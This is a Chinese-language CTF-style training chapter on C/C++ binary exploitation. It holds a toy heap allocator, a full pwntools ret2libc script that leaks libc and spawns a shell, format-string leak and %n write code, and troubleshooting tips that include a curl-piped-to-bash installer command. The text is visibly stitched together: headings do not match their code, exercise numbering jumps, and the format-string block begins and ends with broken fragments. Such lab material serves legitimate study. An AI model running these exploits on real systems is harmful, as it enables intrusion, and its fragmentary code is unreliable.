# 练习方法——C/C++安全研究系统化训练指南

本章是整个C/C++安全研究章节的实战训练手册。前面的理论基础、核心技巧、实战案例提供了知识输入，而本章解决的是**如何将知识转化为能力**的问题。安全研究不是"看过就会"的领域——你需要亲手写漏洞代码、亲手调试内存布局、亲手构建exploit，才能真正理解攻击与防御的本质。

本章按照**四个阶段**组织训练路径，每个阶段都有明确的目标、具体的练习任务、可验证的产出物，以及常见卡点的解决方案。无论你是零基础入门者还是有经验的开发者，都可以找到适合自己的切入点。

---

## 为什么需要系统化练习

安全研究领域存在一个典型的学习陷阱：**碎片化知识无法形成战斗力**。你可能看过十篇栈溢出的writeup，但真正拿到一个二进制文件时仍然无从下手。原因在于：

| 表面学习 | 深度练习 |
|---------|---------|
| 知道"栈溢出覆盖返回地址" | 能用GDB在内存中精确定位返回地址的位置 |
| 知道"ROP链拼接gadgets" | 能手动在二进制中搜索、验证、拼接gadgets |
| 知道"格式化字符串%n写入" | 能计算精确的偏移和payload构造 |
| 知道"堆利用需要控制chunk" | 能画出malloc/free后的堆布局图 |

系统化练习的目标是：**让每一种攻击技术从"知道"变成"做到"**。

## 第一阶段：C语言基础（2-3周）

### 阶段目标

这一阶段的目标不是"学会C语言"——假设你已经有了基本的C语言知识。这个阶段的目标是**将C语言知识深化到安全研究所需的层次**：

- 能够不借助库函数实现字符串操作，理解每一步的内存变化
- 能够手动管理动态内存，理解malloc/free的底层行为
- 能够熟练使用指针和函数指针，理解间接调用的内存本质
- 能够使用valgrind检测内存错误，并理解错误的根因

### 练习1：字符串操作函数——理解缓冲区的本质

**为什么重要**：堆利用的核心前提就是理解内存分配器的行为。通过自己实现一个简单的分配器，你能直观理解chunk的结构、free list的管理、以及为什么特定的分配/释放顺序可以被利用。

```c
// my_allocator.c
// 练习目标：实现一个简单的堆内存分配器
// 编译：gcc -g -Wall -o my_allocator my_allocator.c

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>

// ====== 内存块头部 ======
// 类似glibc malloc的chunk header
typedef struct Block {
    size_t size;          // 数据区大小
    int free;             // 是否空闲
    struct Block *next;   // 下一个块（链表结构）
} Block;

#define BLOCK_SIZE sizeof(Block)
#define ALIGN8(x) (((x) + 7) & ~7)

static Block *heap_start = NULL;

// 练习1：在堆上找到合适的位置
// 这模拟了malloc的"first fit"策略
Block *find_free_block(size_t size) {
    Block *current = heap_start;
    while (current) {
        if (current->free && current->size >= size) {
            return current;  // 找到一个够大的空闲块
        }
        current = current->next;
    }
    return NULL;  // 没有合适的空闲块
}

// 练习2：向操作系统申请更多内存
// 这模拟了malloc调用sbrk/mmap扩展堆
Block *request_space(size_t size) {
    Block *block = (Block *)sbrk(0);  // 获取当前break位置
    if (sbrk(BLOCK_SIZE + size) == (void *)-1) {
        return NULL;  // 申请失败
    }
    block->size = size;
    block->free = 0;
    block->next = NULL;
    return block;
}

// 练习3：malloc的实现
void *my_malloc(size_t size) {
    if (size <= 0) return NULL;

    size = ALIGN8(size);

    Block *block;
    if (!heap_start) {
        // 第一次调用，直接申请空间
        block = request_space(size);
        if (!block) return NULL;
        heap_start = block;
    } else {
        // 尝试找到空闲块（first fit）
        Block *last = heap_start;
        block = find_free_block(size);
        if (!block) {
            // 没找到，申请新空间
            block = request_space(size);
            if (!block) return NULL;
            last->next = block;
        } else {
            // 找到了，标记为已用
            block->free = 0;
            // 如果块比需要的大很多，可以拆分（split）
            // TODO: 实现块拆分逻辑
        }
    }

    return (void *)(block + 1);  // 返回数据区指针（跳过header）
}

// 练习4：free的实现
void my_free(void *ptr) {
    if (!ptr) return;

    Block *block = (Block *)ptr - 1;  // 回退到header
    block->free = 1;

    // TODO: 实现合并（coalesce）相邻空闲块
    // 这是理解堆利用的关键：
    // - 如果不合并，会产生碎片
    // - 合并时需要修改size和next指针
    // - 攻击者可以通过伪造chunk来利用合并过程
}

// 练习5：调试打印——查看堆布局
void dump_heap() {
    Block *current = heap_start;
    int i = 0;
    printf("\n=== 堆布局 ===\n");
    printf("%-4s %-18s %-8s %-6s %-18s %-8s\n",
           "No", "Block地址", "大小", "状态", "数据区地址", "下一块");
    printf("---- ------------------ -------- ------ ------------------ --------\n");
    while (current) {
        printf("%-4d %-18p %-8zu %-6s %-18p %-18p\n",
               i,
               (void *)current,
               current->size,
               current->free ? "FREE" : "USED",
               (void *)(current + 1),
               (void *)current->next);
        current = current->next;
        i++;
    }
    printf("=== 共%d个块 ===\n\n", i);
}

// ====== 测试 ======
int main() {
    printf("=== 分配器测试 ===\n");

    // 分配几块内存
    void *a = my_malloc(32);
    void *b = my_malloc(64);
    void *c = my_malloc(128);
    printf("分配 a=%p, b=%p, c=%p\n", a, b, c);
    dump_heap();

    // 释放中间那块
    my_free(b);
    printf("释放b后：\n");
    dump_heap();

    // 分配一个较小的块——应该复用b的空间
    void *d = my_malloc(16);
    printf("分配d=%p（应该复用b的空间）\n", d);
    dump_heap();

    // 写入数据验证
    memset(a, 'A', 32);
    memset(c, 'C', 128);
    memset(d, 'D', 16);
    printf("写入数据完成\n");

    // 安全漏洞演示
    printf("\n=== 安全漏洞演示 ===\n");
    printf("1. 如果写入超过32字节到a，会覆盖b的header（堆溢出）\n");
    printf("2. 如果free(b)后再使用b，就是UAF（Use After Free）\n");
    printf("3. 如果double free(b)，可以制造重叠chunk\n");

    return 0;
}
```

### 练习10：ret2libc——绕过NX保护

当程序开启NX（栈不可执行）时，你不能在栈上执行shellcode。ret2libc通过调用libc中的函数（如system）来绕过这个限制。

```python
#!/usr/bin/env python3
"""
ret2libc_exercise.py
练习目标：掌握ret2libc的完整利用流程
"""

from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

def ret2libc_local():
    """本地ret2libc练习"""
    elf = ELF('/tmp/full_pwn')  # 使用前面的练习程序

    # Step 1: 确定libc版本
    # 方法1：通过泄漏的地址查询libc.blukat.me
    # 方法2：如果本地运行，直接用本地libc
    libc = elf.libc
    if not libc:
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

    log.info(f"libc path: {libc.path}")

    # Step 2: 构造ROP链
    rop = ROP(elf)
    rop_libc = ROP(libc)

    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    ret = rop.find_gadget(['ret'])[0]

    # Step 3: 泄露libc地址（通过puts打印GOT表）
    # 假设程序有puts@plt和puts@got
    puts_plt = elf.plt.get('puts', 0)
    puts_got = elf.got.get('puts', 0)
    main_addr = elf.symbols['main']

    if puts_plt and puts_got:
        # 第一次溢出：泄露puts的真实地址
        offset = 72
        payload1 = b'A' * offset
        payload1 += p64(pop_rdi)
        payload1 += p64(puts_got)
        payload1 += p64(puts_plt)
        payload1 += p64(main_addr)  # 返回main，再次溢出

        p = process('/tmp/full_pwn')
        p.recvuntil(b'Input: ')
        p.sendline(payload1)

        # 接收泄漏的地址
        leaked = p.recvline().strip()
        puts_addr = u64(leaked.ljust(8, b'\x00'))
        log.info(f"puts leaked address: {hex(puts_addr)}")

        # Step 4: 计算libc基址
        libc_base = puts_addr - libc.symbols['puts']
        log.info(f"libc base: {hex(libc_base)}")

        # Step 5: 计算system和"/bin/sh"的地址
        system_addr = libc_base + libc.symbols['system']
        bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))
        log.info(f"system: {hex(system_addr)}")
        log.info(f"/bin/sh: {hex(bin_sh_addr)}")

        # Step 6: 第二次溢出：调用system("/bin/sh")
        payload2 = b'A' * offset
        payload2 += p64(ret)  # 栈对齐
        payload2 += p64(pop_rdi)
        payload2 += p64(bin_sh_addr)
        payload2 += p64(system_addr)

        p.recvuntil(b'Input: ')
        p.sendline(payload2)
        p.interactive()
    else:
        log.warning("程序没有puts@plt或puts@got，无法练习ret2libc")

def one_gadget_example():
    """one_gadget：只需控制一个地址就能获取shell"""
    # one_gadget是libc中满足特定条件时可以直接跳转获取shell的地址
    # 安装：apt install ruby && gem install one_gadget
    # 使用：one_gadget /lib/x86_64-linux-gnu/libc.so.6
    # 输出几个地址，满足约束条件时直接跳转即可
    log.info("one_gadget的使用：")
    log.info("1. one_gadget /lib/x86_64-linux-gnu/libc.so.6")
    log.info("2. 选择约束最少的地址")
    log.info("3. 在ROP链中直接跳转到该地址")

if __name__ == '__main__':
    ret2libc_local()
```

```python
fmtstr_exercise.py

#include <stdlib.h>

}
"""

    f.write(FMT_SRC)
os.system('gcc -g -no-pie -fno-stack-protector -o /tmp/fmt_vuln /tmp/fmt_vuln.c')

def find_offset():
    """确定格式化字符串参数的偏移"""
    p = process('/tmp/fmt_vuln')
    p.recvuntil(b'Input: ')
    # 发送标记性pattern
    p.sendline(b'AAAA.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x')
    output = p.recvline()
    log.info(f"输出: {output}")
    # 找到41414141出现在第几个%x的位置
    # 这就是偏移量
    p.close()

def leak_memory():
    """利用%s泄漏任意地址的内容"""
    elf = ELF('/tmp/fmt_vuln')
    secret_addr = elf.symbols['secret']
    log.info(f"secret @ {hex(secret_addr)}")

    p = process('/tmp/fmt_vuln')
    p.recvuntil(b'Input: ')

    # 构造payload：在栈上放地址，用%s读取
    # 偏移量需要通过find_offset确定
    offset = 7  # 假设偏移是7
    payload = p64(secret_addr)  # 地址放在payload开头
    payload += b'.%7$s.'       # 用%s读取偏移7处的值（就是我们放的地址）
    p.sendline(payload)

    output = p.recvline()
    log.info(f"泄漏结果: {output}")
    p.close()

def write_memory():
    """利用%n向任意地址写入数据"""
    elf = ELF('/tmp/fmt_vuln')
    secret_addr = elf.symbols['secret']
    log.info(f"secret @ {hex(secret_addr)}")

    p = process('/tmp/fmt_vuln')
    p.recvuntil(b'Input: ')

    # 方法1：手动构造（理解原理）
    target_value = 0xdeadbeef
    # 将目标值拆分为两个16位写入
    # low = target_value & 0xffff = 0xbeef
    # high = (target_value >> 16) & 0xffff = 0xdead
    # 注意：写入是累计的，先写小值再写大值

    # 方法2：用pwntools的fmtstr_payload自动生成（推荐）
    offset = 7
    writes = {secret_addr: 0xdeadbeef}
    payload = fmtstr_payload(offset, writes)
    log.info(f"payload长度: {len(payload)}")

    p.sendline(payload)
    output = p.recvall(timeout=2)
    log.info(f"结果: {output}")
    p.close()

def advanced_techniques():
    """高级格式化字符串技巧"""

    log.info("3. %hhn：写入1字节（最精确）")
    log.info("4. 格式化字符串+ROP组合：先泄漏地址再写入")
    log.info("5. 在栈空间有限时使用short写入策略")

if __name__ == '__main__':
```

### 方法2：调试驱动学习法

对于二进制安全研究，**调试是最高效的学习方式**。不是先学理论再调试，而是**通过调试来理解理论**。

```bash
# 调试驱动学习的标准流程（以每个CTF题目为单位）

# Phase 1: 信息收集（5-10分钟）
checksec ./target_binary      # 检查保护
file ./target_binary          # 文件类型
ldd ./target_binary           # 动态链接库
strings ./target_binary | head -50  # 可打印字符串

# Phase 2: 静态分析（15-30分钟）
# 用Ghidra/IDA：
# - 找到main函数
# - 识别输入函数（read/gets/fgets/scanf）
# - 找到危险函数（strcpy/sprintf/gets）
# - 找到目标函数（system/win/flag）
# - 理解程序逻辑

# Phase 3: 动态分析（30-60分钟）
gdb ./target_binary
# - 在关键函数下断点
# - 输入标记性数据（AAAA.BBBB.CCCC...）
# - 观察栈布局、堆布局
# - 确定溢出偏移
# - 确定漏洞类型

# Phase 4: 漏洞利用（30-60分钟）
# - 编写exploit脚本
# - 本地调试直到成功
# - 远程测试

# Phase 5: 总结（10-15分钟）
# - 记录关键技术点
# - 记录踩过的坑
# - 思考变体：如果保护更强怎么绕过？
```

### 方法4：Writeup阅读法

阅读高手的writeup是快速提升的捷径，但要**有方法地阅读**，而不是看完就算。

```text
高效阅读Writeup的步骤：

1. 先自己尝试（30分钟）
   - 不要先看writeup
   - 尝试分析漏洞、构造exploit
   - 即使失败了，你也获得了"卡在哪里"的信息

2. 第一遍快速浏览（5分钟）
   - 了解题目类型、用了什么技术
   - 确认自己的分析方向是否正确

3. 第二遍详细阅读（15-30分钟）
   - 每一步都问：为什么这样做？
   - 关注：作者是怎么想到这个思路的？
   - 关注：偏移是怎么确定的？gadget是怎么找的？

4. 复现（30-60分钟）
   - 按照writeup的步骤，自己动手实现
   - 如果结果不一致，调试分析差异

5. 变体思考（10分钟）
   - 如果加了canary怎么绕过？
   - 如果是PIE怎么处理？
   - 如果glibc版本不同怎么调整？

6. 归类总结
   - 这个题目属于哪个知识节点？
   - 和之前做过的哪些题目类似？
   - 有什么新的技巧值得记录？

推荐Writeup来源：
- CTFtime.org（国际CTF比赛的writeup）
- BUUCTF讨论区
- GitHub上的CTF-Writeups仓库
- 个人安全博客（看雪、安全客、先知社区）
```

## 常见卡点与解决方案

学习过程中几乎所有人都会遇到以下卡点。提前了解这些卡点及其解决方案，可以避免在同一个地方浪费大量时间。

### 卡点1：环境搭建失败

**症状**：pwntools安装报错、GDB插件不工作、编译32位程序缺库

**解决方案**：
```bash
# pwntools安装
pip3 install --upgrade pip
pip3 install pwntools
# 如果失败，尝试：
sudo apt install python3-dev python3-pip libffi-dev libssl-dev
pip3 install pwntools

# 32位编译支持
sudo apt install gcc-multilib g++-multilib

# GDB插件
# pwndbg安装失败时，尝试GEF：
bash -c "$(curl -fsSL https://gef.blah.cat/sh)"

# Docker环境（如果本机环境太乱）
docker pull skysider/pwndocker
docker run -it --rm -v $(pwd):/ctf skysider/pwndocker
```

### 卡点2：不知道偏移怎么确定

**症状**：知道要溢出，但不知道该填充多少字节

**三种确定偏移的方法**：

```bash
# 方法1：手动计算（最基础）
# buffer大小 + 对齐padding + saved rbp(8字节)
# 例：char buf[64] → 64 + 0 + 8 = 72

# 方法2：GDB + pattern（最常用）
# 用pwndbg/GEF的pattern功能
(gdb) pattern create 200
# 输入后程序崩溃
(gdb) pattern offset <crash_addr>

# 方法3：pwntools cyclic（脚本化）
python3 -c "
from pwn import *
# 生成pattern并写入文件
payload = cyclic(200)
open('/tmp/input', 'wb').write(payload)
# 崩溃后查看core dump中的值
# cyclic_find(0x6161616c)  # 替换为实际值
"
```

### 卡点3：exp能本地打但远程失败

**症状**：本地获取shell成功，远程一模一样的payload却失败

**常见原因和解决**：

```python
# 1. libc版本不同（最常见）
# 本地和远程的libc版本不同，函数偏移不同
# 解决：获取远程libc版本
# p.recvuntil(b'libc: ')  # 如果程序打印了版本
# 或者通过泄漏的地址在libc.blukat.me上查询

# 2. 偏移不同
# 本地编译参数和远程不一致导致栈布局不同
# 解决：必须在和远程完全相同的环境下调试

# 3. 栈对齐问题
# 有些system调用需要16字节栈对齐
# 解决：在ROP链中加一个ret gadget
payload = b'A' * offset
payload += p64(ret_gadget)  # 额外的ret保证栈对齐
payload += p64(pop_rdi)
payload += p64(bin_sh_addr)
payload += p64(system_addr)

# 4. 标准输入缓冲区问题
# 解决：用sendafter/sendlineafter代替send/sendline
p.sendafter(b'Input: ', payload)
```

### 卡点4：堆利用看懂了但不会写

**症状**：看How2Heap的代码能理解，但自己拿到题目不知道怎么利用

**解决方案**：
```text
1. 先画堆布局图
   - 拿到题目后，不要急着写exploit
   - 先分析程序有哪些malloc/free操作
   - 在纸上画出每次操作后的堆布局

2. 识别漏洞类型
   - 能double free吗？
   - 能溢出到相邻chunk吗？
   - 有UAF吗？
   - 能控制fd/bk指针吗？

3. 选择利用技术
   - 如果有fastbin double free → fastbin_dup
   - 如果能控制tcache fd → tcache_poisoning
   - 如果能写unsorted bin → unsorted_bin_attack

4. 从小目标开始
   - 不要一上来就想拿shell
   - 先实现：泄漏堆地址 → 泄漏libc地址 → 任意地址写 → 拿shell
```

### 卡点5：学习进度停滞

**症状**：做了很多题但感觉没有进步，新题还是不会

**解决方案**：
```text
1. 回归基础
   - 重新做一遍入门题，这次不用任何参考
   - 如果还是卡，说明基础不牢

2. 换一种学习方式
   - 如果一直在做题，试试写教程（教别人是最好的学习）
   - 如果一直在看书，试试动手做题
   - 如果一直独自学习，试试参加CTF比赛

3. 系统性梳理
   - 更新你的知识图谱
   - 找出薄弱环节，针对性练习
   - 把做过的题分类，看看哪类题做得最少

4. 调整难度
   - 题目太简单：跳过基础，直接做进阶
   - 题目太难：降级做更基础的题
   - 太久没突破：换一个子领域（如从栈溢出换到格式化字符串）
```
